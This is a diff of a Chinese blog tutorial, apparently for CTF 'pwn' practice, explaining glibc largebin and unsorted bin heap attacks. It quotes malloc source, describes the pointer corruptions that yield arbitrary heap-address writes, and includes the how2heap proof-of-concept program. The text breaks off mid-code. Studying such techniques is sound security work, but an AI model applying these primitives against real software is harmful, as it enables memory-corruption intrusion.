@@ -145,198 +145,279 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">largebin attack</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-02-23 13:35:47
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/largebin-attack/">largebin attack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>关于largebin的原理这里就只给一张图吧，也是在网上找的(我懒得画)。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/20190516131203-242dd8f2-7799-1.png"
+                      alt="20190516131203-242dd8f2-7799-1"
+                ></p>
+<p>largebin一直是容易被忽略的利用方式(可能只是我这样吧)，在此之前我一直觉得largebin不会出现直到最近的比赛怎么全是这玩意，所以又下来学习了一遍。</p>
+<h2 id="Glibc2-23到Glibc2-27下的largebin-attack"><a href="#Glibc2-23到Glibc2-27下的largebin-attack" class="headerlink" title="Glibc2.23到Glibc2.27下的largebin attack"></a>Glibc2.23到Glibc2.27下的largebin attack</h2><p>其实Glibc2.27和Glibc2.23的利用方式都差不多，只不过在2.27里增加了tcache机制，所以想实现largebin attack要么占满tcache，或则大于tcache范围。</p>
+<p>下面源码是当unsorted bin 当作的chunk进入large bin的过程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index); </span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)               </span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd)) </span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
 
+<p>这里的第二个if判断的就是size如果小于最小的size的时候发生的事情，但是那里的内容相较于下面不是很好利用。所以直接看下面。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">        == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">        fwd = fwd-&gt;fd; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+<p>这里就是我们主要的利用代码，这里的if判断的是找到相同size的chunk发生什么，但是我们真正利用的代码其实是else里面的。现在假设我们存在一个已经在large bin的chunk1：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = target<span class="number">-0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+<p>和一个在unsorted bin当中的chunk2：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x460</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = <span class="number">0</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
+<p>当我们下一次malloc一个size大于0x460的chunk时那么chunk2就会进入large bin，此时就会执行以下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>
 
-    }
+<p>翻译过来就是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;fd_nextsize = chunk1;</span><br><span class="line">chunk2-&gt;bk_nextsize = chunk1-&gt;bk_nextsize; <span class="comment">// chunk1-&gt;bk_nextsize = target-0x20</span></span><br><span class="line"><span class="comment">// 这一步过后，chunk2-&gt;bk_next_size也就变成了target-0x20</span></span><br><span class="line">chunk1-&gt;bk_nextsize = chunk2;</span><br><span class="line">chunk2-&gt;bk_nextsize-&gt;fd_nextsize = chunk2;</span><br><span class="line"><span class="comment">// 所以这一步最终的形式其实是</span></span><br><span class="line">*(target<span class="number">-0x20</span>)-&gt;fd_nextsize = chunk2;</span><br></pre></td></tr></table></figure>
 
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-  }
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
+<p>victim这样就在target位置写上了chunk2的地址。</p>
+<p>另外在这里还存在另一个可以任意地址写入堆地址的地方：</p>
+<p>此时chunk1变为:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="number">0x450</span>;</span><br><span class="line">&#123;</span><br><span class="line">    fd = <span class="number">0</span>;</span><br><span class="line">    bk = target<span class="number">-0x10</span>;</span><br><span class="line">    fd_nextsize = <span class="number">0</span>;</span><br><span class="line">    bk_nextsize = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
 
-      +keep-tablet() {
-        display: none;
-      }
-    }
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bck = fwd-&gt;bk;   上面执行完之后有这样一句</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
 
-  }
+<p>翻译过来也就是：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2-&gt;bk = target<span class="number">-0x10</span>;</span><br><span class="line">chunk2-&gt;fd = chunk1;</span><br><span class="line">chunk1-&gt;bk = chunk2;</span><br><span class="line">*(target<span class="number">-0x10</span>)-&gt;fd = chunk2;</span><br></pre></td></tr></table></figure>
+
+<p>也就是如果同时修改了bk和bk_nextsize的话可以同时修改两处地址的值为堆地址。</p>
+<h2 id="Glibc2-29下的largebin-attack"><a href="#Glibc2-29下的largebin-attack" class="headerlink" title="Glibc2.29下的largebin attack"></a>Glibc2.29下的largebin attack</h2><p>这里的攻击方式和上面的很类似，首先看一下源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    	victim_index = largebin_index (size); </span><br><span class="line">      bck = bin_at (av, victim_index);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">  &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">              <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                &#123;</span><br><span class="line">                  fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">assert (chunk_main_arena (fwd));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">// but size must be different</span></span><br><span class="line">              <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br><span class="line">                &#125;</span><br><span class="line">              bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure>
+
+<p>其实很明显的可以看出来下面仍然存在相应的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br></pre></td></tr></table></figure>
+
+<h3 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>在这里说一下unsorted bin attack，虽然在2.29出来之后基本就没法利用了但是害怕题目出的libc版本在以往的版本然后又限制大小所以这里还是提一下unsorted bin attack</p>
+<p>这里就不提出全部源码就把存在漏洞的两行提出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来如果我们可以控制unsorted_chunks (av)的bk指针，那就可以向任意地址写入堆地址了。</p>
+<p>这里直接给出how2heap当中的poc吧：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stackn&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attacknn&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %ldnn&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p=<span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, we allocate first normal chunk on the heap at: %pn&quot;</span>,p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()nn&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">           <span class="string">&quot;point to %pn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    p[<span class="number">1</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointern&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%pnn&quot;</span>,(<span class="keyword">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, target should has already been &quot;</span></span><br><span class="line">           <span class="string">&quot;rewrite:n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %pn&quot;</span>, &amp;stack_var, (<span class="keyword">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写的很详细，如果看不懂可以-g编译调试一下。</p>
+<h2 id="Glibc2-31下的largebin-attack"><a href="#Glibc2-31下的largebin-attack" class="headerlink" title="Glibc2.31下的largebin attack"></a>Glibc2.31下的largebin attack</h2><p>先看一下源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = 